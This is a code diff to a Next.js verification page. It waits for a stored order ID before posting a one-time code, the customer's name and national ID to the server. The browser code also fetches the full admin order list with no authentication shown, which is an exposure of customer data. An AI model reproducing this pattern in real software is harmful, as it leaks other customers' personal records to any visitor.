@@ -60,6 +60,14 @@ export default function VerifyPage() {
 
   async function handleSubmit() {
     if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
+
+    // تأكد إن الـ orderId اتحفظ — لو لسه ما جاش، استنى شوية
+    let currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
+    if (currentOrderId === "—") {
+      await new Promise(r => setTimeout(r, 2000));
+      currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
+    }
+
     setSubmitCooldown(5);
     submitCooldownRef.current = setInterval(() => {
       setSubmitCooldown(prev => {
@@ -72,12 +80,12 @@ export default function VerifyPage() {
     await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
+      body: JSON.stringify({ code, orderId: currentOrderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
     });
     try {
       const res = await fetch("/api/admin/orders");
       const orders = await res.json();
-      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
+      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === currentOrderId) : null;
       if (match) setDbOrderId(match._id);
     } catch {}
   }
